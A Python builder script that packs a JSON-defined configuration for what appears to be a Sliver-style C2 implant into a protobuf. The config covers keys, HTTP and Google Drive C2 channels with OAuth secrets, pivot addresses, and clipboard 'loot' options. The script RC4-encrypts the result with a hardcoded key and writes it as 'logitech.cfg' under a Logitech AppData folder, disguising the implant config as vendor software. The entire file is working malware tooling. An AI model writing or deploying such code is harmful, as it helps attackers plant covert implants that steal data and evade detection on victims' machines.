from protobuf import config_pb2
from hexdump import hexdump
import sys
import json
from Crypto.Cipher import ARC4

if len(sys.argv) != 2:
    exit(-1)

f = open(sys.argv[1])
data = json.load(f)

config = config_pb2.Config()
config.ServerPublicKey = data['ServerPublicKey']
config.PeerPublicKey = data['PeerPublicKey']
config.PeerPrivateKey = data['PeerPrivateKey']
config.ServerMinisignPublicKey = data['ServerMinisignPublicKey']
config.SliverName = data['SliverName']
config.ConfigID = data['ConfigID']
config.PeerAgePublicKeySignature = data['PeerAgePublicKeySignature']
config.EncoderNonce = data['EncoderNonce']
config.MaxConnectionErrors = data['MaxConnectionErrors']
config.ReconnectInterval = data['ReconnectInterval']
config.SliverPath = data['SliverPath']
config.LootClipboard = data['Clipboard']
config.Loot = data['Loot']

config.Protocol = data['Protocol']
config.Type = data['Type']
for cfg in data['HttpConfigs']:
    http_config = config.HttpConfigs.add()
    poll_paths = cfg['PollPaths']
    poll_files = cfg['PollFiles']
    session_paths = cfg['SessionPaths']
    session_files = cfg['SessionFiles']
    close_paths = cfg['ClosePaths']
    close_files = cfg['CloseFiles']
    for i in poll_paths:
        http_config.PollPaths.append(i)

    for i in poll_files:
        http_config.PollFiles.append(i)

    for i in session_paths:
        http_config.SessionPaths.append(i)

    for i in session_files:
        http_config.SessionFiles.append(i)

    for i in close_paths:
        http_config.ClosePaths.append(i)

    for i in close_files:
        http_config.CloseFiles.append(i)

    http_config.UserAgent = cfg["UserAgent"]
    http_config.OtpSecret = cfg["OtpSecret"]
    http_config.MinNumberOfSegments = cfg["MinNumberOfSegments"]
    http_config.MaxNumberOfSegments = cfg["MaxNumberOfSegments"]
    http_config.PollInterval = cfg["PollInterval"]
    http_config.URL = cfg["URL"]

for cfg in data['DriveConfigs']:
    drive_config = config.DriveConfigs.add()
    drive_config.ClientID = cfg["ClientID"]
    drive_config.ClientSecret = cfg["ClientSecret"]
    drive_config.RefreshToken = cfg["RefreshToken"]
    drive_config.UserAgent = cfg["UserAgent"]
    drive_config.StartExtension = cfg["StartExtension"]
    drive_config.SendExtension = cfg["SendExtension"]
    drive_config.RecvExtension = cfg["RecvExtension"]
    drive_config.RegisterExtension = cfg["RegisterExtension"]
    drive_config.CloseExtension = cfg["CloseExtension"]
    drive_config.PollInterval = cfg["PollInterval"]

for cfg in data['PivotConfigs']:
    pivot_config = config.PivotConfigs.add()
    pivot_config.BindAddress = cfg["BindAddress"]

marshaled_data = config.SerializeToString()
hexdump(marshaled_data)
cipher = ARC4.new(b'config_key')
ciphertext = cipher.encrypt(marshaled_data)
hexdump(ciphertext)
open('.\\x64\\Debug\\logitech.cfg', 'wb').write(ciphertext)
open('C:\\Users\\Admin\\AppData\\Roaming\\Logitech\\logitech.cfg', 'wb').write(ciphertext)
f.close()